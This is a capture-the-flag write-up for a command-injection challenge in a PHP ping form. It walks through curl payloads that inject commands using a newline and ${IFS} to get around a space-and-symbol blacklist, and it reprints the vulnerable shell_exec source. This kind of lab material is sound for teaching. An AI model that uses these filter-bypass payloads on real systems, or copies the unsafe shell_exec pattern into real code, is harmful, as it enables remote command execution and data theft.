# 3 - No Space Left

Once in a remote Norwegian town, a group of skilled security professionals had convened in a fancy cabin to collaborate and achieve their objectives. On their network, they found a number of challenges that required their collective expertise. Do you have what it takes to tackle these challenges too?

http://rsxc.no:9007

# Note

Number 3 to 6 I used a few minutes to check out, then I randomly tested if the flag was unprotected as it is in the same folder as the `index.php` and sure enough. I could just access `flag.txt` by adding that to the URL. So my points skyrocketed at that moment. 

I knew that was not the intended solution so even if I got the flag I wanted to complete it "legally" before continuing so I could write a proper writeup.

**Update**: This was fixed later on and flag is now in `/flag.txt`. This writeup still works the same just add a `/`

# Writup

I must admit that getting nothing back on any attempts makes this hard. But I see illegal input on a lot of characters and since the title is `no space left` I do see it there to.

So what to append to `nonexistingcommand $1` to make it work. I tested a few things and I saw that newline works. So using curl I can easily send a newline like this. I could prolly urlencode it aswell but this gave me an `ls` output.

```console
toffe@kali:~$ curl http://rsxc.no:9007 -d "ip=
ls"
```

This returned:

```html
<html>
<head>
        <title>No space left</title>
        <link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
        <h1>No space left</h1>
        <form method="post">
                <p>Input a valid IP to ping:</p>
                <input type="text" name="ip">
                <input type="submit" value="Ping">
        </form>
        <pre class='output'>flag.txt
index.php
style.css
</pre></body>
</html>
```

So newline then we need to output the file data. So I googled `how to cat a file without space` and [stackexchange](https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces) to the rescue.

```console
toffe@kali:~$ curl http://rsxc.no:9007 -d "ip=
cat\${IFS}flag.txt"
```

There we had the flag. We cat the php for information:

```php
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $ip = $_POST['ip'];

        if (preg_match('/[&|;`\'" ]/',$ip)) {
                echo "<p align='center' style='color:red;'>Illegal Input Discovered</p>";
                die();
        }

        $output = shell_exec("ping -c 1 $ip");
        echo "<pre class='output'>$output</pre>";
}
?>
```

# Flag

```
RSXC{NO_MORE_SPACES_WERE_ALLOWED_BUT_NEWLINES_ARE_OK}
```